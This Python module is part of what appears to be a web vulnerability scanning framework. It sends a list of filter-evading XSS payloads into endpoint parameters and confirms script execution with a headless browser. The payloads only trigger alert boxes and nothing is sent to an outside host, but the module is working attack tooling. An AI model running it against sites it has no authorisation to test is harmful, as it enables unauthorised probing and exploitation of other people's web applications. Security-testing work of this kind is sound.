from .base import AttackModule, register_module, Endpoint, Parameter, ParameterProfile, Finding
from awap.engines.response.analyzer import ResponseAnalysisEngine
import httpx
from playwright.async_api import async_playwright

@register_module
class XSSModule(AttackModule):
    module_id = "xss_reflected"
    vuln_class = "XSS"
    severity = "HIGH"

    # Minimal polymorphic payloads meant to bypass common superficial filters
    PAYLOADS = [
        "'\"><script>alert(1337)</script>",
        "\" autofocus onfocus=alert(1337)//",
        "</script><svg/onload=alert(1337)>",
        "javascript:alert(1337)//",
        "'-alert(1337)-'"
    ]

    async def run(self, endpoint: Endpoint, param: Parameter, profile: ParameterProfile) -> list[Finding]:
        findings = []
        rae = ResponseAnalysisEngine()

        for payload in self.PAYLOADS:
            test_url = endpoint.url
            if param.location == "query":
                sep = "&" if "?" in test_url else "?"
                test_url = f"{test_url}{sep}{param.name}={payload}"
            
            try:
                # 1. Quick HTTP fetch to check for pure reflection (RAE)
                async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                    if endpoint.method.upper() == "GET":
                        response = await client.get(test_url)
                    else:
                        response = await client.post(endpoint.url, data={param.name: payload})

                analysis = rae.analyze_response(test_url, response, payload)
                
                # 2. If RAE detected Reflection, verify actual Execution via Headless Browser
                if "DIRECT_REFLECTION_FOUND" in analysis.get("evidence", []):
                    executed = await self._verify_execution_via_browser(test_url, endpoint.method, param, payload)
                    if executed:
                        request_raw = f"{endpoint.method} {test_url}\nHost: {response.url.host}"
                        finding = self.build_finding(
                            endpoint=endpoint,
                            param=param,
                            payload=payload,
                            request_raw=request_raw,
                            response_raw=response.text[:2000], # Store preview
                            confidence=0.99, # Firing headless JS alert is 99% confident
                            evidence={
                                "execution_confirmed": True,
                                "matched_payload": payload,
                                "reflection_analysis": analysis
                            }
                        )
                        findings.append(finding)
                        break  # Found a working payload, move on
                        
            except Exception as e:
                pass
                
        return findings

    async def verify(self, finding: Finding) -> bool:
        return True

    async def _verify_execution_via_browser(self, test_url: str, method: str, param: Parameter, payload: str) -> bool:
        """
        Uses Playwright to physically load the payloaded page and listen for the `dialog` event
        to absolutely confirm real DOM XSS execution without false positives.
        """
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(ignore_https_errors=True)
            page = await context.new_page()
            
            # Watchdog for malicious alert explosion
            xss_triggered = False
            async def handle_dialog(dialog):
                nonlocal xss_triggered
                if dialog.message == "1337" or dialog.type == "alert":
                    xss_triggered = True
                await dialog.dismiss()

            page.on("dialog", handle_dialog)
            
            try:
                if method.upper() == "GET":
                    await page.goto(test_url, wait_until="load", timeout=5000)
                else:
                    # Execute a scripted POST request
                    await page.route("**/*", lambda route: route.continue_(
                        method="POST",
                        post_data=f"{param.name}={payload}",
                        headers={"Content-Type": "application/x-www-form-urlencoded"}
                    ) if route.request.url == test_url else route.continue_())
                    await page.goto(test_url, wait_until="load", timeout=5000)
                    
            except Exception:
                pass
            finally:
                await browser.close()
                
            return xss_triggered
